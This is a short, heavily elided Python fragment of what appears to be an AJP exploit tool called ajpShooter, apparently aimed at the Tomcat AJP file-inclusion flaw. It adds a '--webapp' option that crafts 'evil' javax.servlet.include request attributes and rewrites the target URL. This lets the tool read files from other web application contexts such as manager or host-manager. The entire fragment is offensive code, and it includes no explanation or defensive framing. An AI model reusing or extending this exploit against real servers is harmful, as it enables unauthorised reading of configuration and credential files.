...
class ajpShooter(object):
    ...
    def shoot(self):
        ...
        # ADD WEBAPP SUPPORT HERE
        webapp = getattr(self.args, 'webapp', None)
        if webapp:
            # Modify request_uri to include webapp context
            evil_req_attributes = [
                (b'javax.servlet.include.request_uri', webapp.encode('utf8')),
                (b'javax.servlet.include.servlet_path', target_file)
            ]
            self.requesturl = f"{self.requesturl.rstrip('/')}/{webapp}/"
...
if __name__ == "__main__":
    ...
    parser.add_argument('--webapp', help='webapp context like manager, host-manager')
